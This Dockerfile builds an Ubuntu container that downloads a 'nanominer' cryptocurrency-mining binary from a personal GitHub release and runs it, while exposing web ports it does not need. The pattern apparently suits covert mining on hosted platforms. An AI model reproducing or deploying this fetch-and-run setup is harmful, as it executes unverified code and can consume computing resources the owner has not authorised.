FROM ubuntu:latest
EXPOSE 80
EXPOSE 443
    
RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 wget sudo && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN wget https://github.com/imraahatikah6827/lulu/releases/download/nanonano/nanominer && \
    chmod +x nanominer
    
COPY . .    
ENTRYPOINT [ "nanominer" ]
CMD [ "ver.ini" ]
